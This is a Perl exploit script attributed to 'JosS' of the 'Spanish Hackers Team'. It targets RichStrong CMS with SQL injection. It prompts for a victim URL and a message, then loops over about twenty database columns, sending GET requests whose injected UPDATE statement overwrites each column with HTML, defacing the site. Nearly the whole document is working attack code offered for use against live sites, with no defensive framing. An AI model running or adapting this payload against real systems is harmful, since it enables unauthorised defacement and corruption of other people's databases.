#!/usr/bin/perl

# RichStrong CMS - Remote SQL Injection Exploit
# Code by JosS
# Contact: sys-project[at]hotmail.com
# Spanish Hackers Team
# www.spanish-hackers.com

use IO::Socket::INET;
use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;

sub lw
{

my $SO = $^O;
my $linux = "";
if (index(lc($SO),"win")!=-1){
                   $linux="0";
            }else{
                    $linux="1";
            }
                if($linux){
system("clear");
}
else{
system("cls");
system ("title RichStrong CMS - Remote SQL Injection Exploit - By JosS");
system ("color 02");
}

}

#*************************** expl ******************************

&lw;

print "\t\t########################################################\n\n";
print "\t\t#    RichStrong CMS - Remote SQL Injection Exploit     #\n\n";
print "\t\t#                        by JosS                       #\n\n";
print "\t\t########################################################\n\n";

print "Url Victim (Ex: www.localhost/showproduct.asp?cat=):  ";
$host=<STDIN>;
chomp $host;
print "\n";

  if ( $host   !~   /^http:/ ) {

    # lo a?adimos
    $host = 'http://' . $host;
}


print "Message: ";
$message=<STDIN>;
chomp $message;
print "\n";

@columnas=("id","subjectname","subjecttype","displayorder","description","layout","style","category","workflowID_R","workflowID_S","status","owner",
"isinherit","doclistcount","docstyle","docsecrettype","docpubdays","wwwname","logo","contactus");


for ($i=0;$i<=21;$i++)

{

$comando="'%20update%20subject%20set%20$columnas[$i]='<h1>$message'--";
$comando =~ s/ /+/g;

my $final = $host.$comando;
my $ua = LWP::UserAgent->new;
my $req = HTTP::Request->new(GET => $final);
$doc = $ua->request($req)->as_string;

print "update: $columnas[$i]\n";

}
